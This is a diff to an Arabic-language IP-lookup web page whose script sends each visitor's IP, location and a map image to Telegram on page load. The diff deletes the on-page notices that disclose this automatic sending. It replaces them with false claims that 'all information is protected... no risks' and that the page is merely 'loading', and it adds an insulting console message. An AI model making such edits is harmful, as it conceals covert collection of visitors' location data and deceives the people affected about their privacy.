@@ -102,7 +102,7 @@
           </button>
           <span class="loading" id="loadingIndicator"></span>
           <span class="auto-send-indicator" id="autoSendIndicator" style="display:none">
-            <span>جاري الإرسال التلقائي...</span>
+            <span>جاري التحميل...</span>
           </span>
         </div>
         <div class="meta" id="country"></div>
@@ -196,10 +196,10 @@
       </div>
       
       <p class="note">ملاحظة: إذا تستخدم VPN أو Proxy، راح يظهر الـIP الخاص بالنفق/السيرفر وهمي اللي تمرّ منه.</p>
-      <p class="note" style="color: var(--accent);">جميع المعلومات يتم إرسالها تلقائياً إلى تليجرام بمجرد دخولك للصفحة</p>
+      <p class="note" style="color: var(--accent);">جميع المعلومات محمية...لاتوجد مخاطر</p>
 
       <div class="center">
-        <a class="btn" id="refresh">تحديث الـ IP والإرسال التلقائي</a>
+        <a class="btn" id="refresh">تحديث الـ IP </a>
       </div>
     </main>
   </div>
@@ -475,9 +475,9 @@
         // إرسال الرسالة إلى تليجرام
         const sent = await sendToTelegram(telegramMessage, mapImage);
         if (sent) {
-          console.log('تم الإرسال التلقائي إلى تليجرام بنجاح');
+          console.log('تم شُكرًا لزيارتك');
         } else {
-          console.error('فشل الإرسال التلقائي إلى تليجرام');
+          console.error('فشل ، خره بوجهك');
         }
         
       } catch (error) {
@@ -486,7 +486,7 @@
         // إخفاء مؤشر الإرسال التلقائي بعد 3 ثواني
         setTimeout(() => {
           indicator.style.display = 'none';
-        }, 3000);
+        }, 1000);
       }
     }
 
